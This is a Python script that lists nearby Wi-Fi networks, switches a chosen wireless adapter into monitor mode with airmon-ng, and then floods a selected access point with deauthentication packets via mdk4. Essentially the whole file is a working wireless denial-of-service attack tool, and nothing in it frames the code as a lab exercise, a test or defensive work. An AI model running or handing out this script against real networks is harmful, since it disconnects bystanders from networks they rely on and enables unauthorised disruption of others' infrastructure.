import os

class Disrupt():
	def __init__(self):
		os.system('clear')
		GREEN = '\033[32m'
		DEFAULT = '\033[39m'
		ORANGE = '\033[93m'
		RED = '\033[31m'
		print('Select Adapter')
		devices = self.get_devices()
		for i in range(len(devices)):
			print(f'{GREEN}[{i}] - {devices[i]}{DEFAULT}')
		while True:
			try:
				adapter = int(input('\nSelect Adapter : '))
				if adapter < len(devices):break
			except:exit()
		os.system('clear')
		d = self.get_networks()
		if len(d) == 0:
			input(f'{RED}No WIFI Networks FOUND{DEFAULT}, Press Enter To Exit')
			exit()
		l_ssid = max([len(d[i]['SSID']) for i in d])
		print(f"NO.    BSSID{' ' * 16}SSID{' ' * (l_ssid)}SIG{' ' * 4}CHANNEL\n{'-'*(l_ssid + 46)}")
		for i in d:
			print(f"{i}{' ' * (3-len(str(i)))}    {d[i]['BSSID']}    {d[i]['SSID']}{' ' * (l_ssid - len(d[i]['SSID']))}    {GREEN if int(d[i]['SIGNAL']) > 50 else (ORANGE if int(d[i]['SIGNAL']) > 30 else RED)}{d[i]['SIGNAL']}{' ' * (3 - len(d[i]['SIGNAL']))}{DEFAULT}    {d[i]['CHANNEL']}")
		while True:
			try:
				network = int(input('\nSelect Network : '))
				if network < len(d):break
			except:exit()
		network = d[network]
		os.system('clear')
		os.popen(f'sudo airmon-ng start {devices[adapter]}').read()
		print(f"BSSID : {network['BSSID']}")
		print(f"SSID : {network['SSID']}")
		print(f"CHANNEL : {network['CHANNEL']}")
		print(f"SIGNAL : {network['SIGNAL']}\n")
		print(f"Flooding {GREEN}{network['SSID']} - {network['BSSID']}{DEFAULT} with Deauth Packets")
		cmd = f"sudo mdk4 {devices[adapter]}mon d -c {network['CHANNEL']} -B {network['BSSID']}"
		try:
			process = os.popen(cmd)
			while True:
				line = process.readline().replace('\n', '')
				if line[:7] == 'Packets':print(f"{ORANGE}[+] {line}{DEFAULT}")
		except:
			os.system('clear')
			print(f'Disabling Monitor Mode On {devices[adapter]}')
			os.popen(f'sudo airmon-ng stop {devices[adapter]}mon').read()
			os.system('clear')


	def get_networks(self):
		cmd = 'nmcli --terse -f BSSID,SSID,CHAN,SIGNAL dev wifi'
		d = [i.replace('\\:', '..').split(':') for i in os.popen(cmd).read().split('\n') if len(i.replace('\\:', '..').split(':')) > 1]
		d = dict(enumerate([{'BSSID': i[0].replace('..',':'), 'SSID': i[1], 'CHANNEL': i[2], 'SIGNAL': i[3]} for i in d]))
		return d

	def get_devices(self):
		cmd = 'ifconfig'
		a = os.popen(cmd).read().split('\n\n')
		d = [i.split(': ')[0] for i in a if len(i.split(': ')[0]) != 0 and 'wlan' in i.split(': ')[0]]
		return d

if __name__ == '__main__':
	Disrupt()
